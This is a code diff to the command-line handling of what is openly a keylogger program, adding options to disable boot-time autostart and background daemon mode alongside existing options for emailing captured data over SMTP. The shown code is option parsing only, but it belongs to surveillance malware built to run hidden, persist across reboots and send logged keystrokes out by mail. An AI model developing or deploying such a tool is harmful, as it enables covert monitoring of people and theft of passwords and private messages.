@@ -1,10 +1,19 @@
 #include "usage.h"
 
+int flag_kill = 0;
+int flag_smtp = 0;
+int flag_status = 0;
+int smtp_status = 0;
+int no_bootable = 0;
+int no_daemon = 0;
+
 void usage() {
     printf("Parameters:\n");
     printf("\t-o, --output       file path\n");
     printf("\t-k, --kill         stop\n");
     printf("\t-s, --status       status\n");
+    printf("\t--no-bootable      disable automatic startup\n");
+    printf("\t--no-daemon        no background process will be created\n");
     printf("\t-h, --help         help\n");
 
     printf("\nSend Mail (libquickmail):\n");
@@ -25,10 +34,6 @@ void usage() {
 int keylogger_usage(int argc, char **argv) {
 
   int opt;
-  flag_kill = 0;
-  flag_smtp = 0;
-  flag_status = 0;
-  smtp_status = 0;
 
 struct option long_options[] = {
   {"help",   no_argument,          0, 'h'},
@@ -36,6 +41,8 @@ struct option long_options[] = {
   {"kill",   no_argument,          0, 'k'},
   {"status", no_argument,          0, 's'},
   {"smtp-status", no_argument,     0,  1 },
+  {"no-bootable", no_argument,     0,  2 },
+  {"no-daemon", no_argument,       0,  3 },
   {"smtp-url",  required_argument, 0,  0 },
   {"smtps-url", required_argument, 0,  0 },
   {"mail-from", required_argument, 0,  0 },
@@ -62,11 +69,17 @@ while((opt = getopt_long(argc, argv, "hkso:01", long_options, NULL)) != -1) {
     case 1:
         smtp_status = 1;
       break;
+    case 2:
+        no_bootable = 1;
+      break;
+    case 3:
+        no_daemon = 1;
+      break;
     case 'h':
         usage();
       break;
     case 'o':
-        strncpy(outfile, optarg, 99);
+        strncpy(outfile, optarg, 199);
       break;
     case 'k':
         flag_kill = 1;
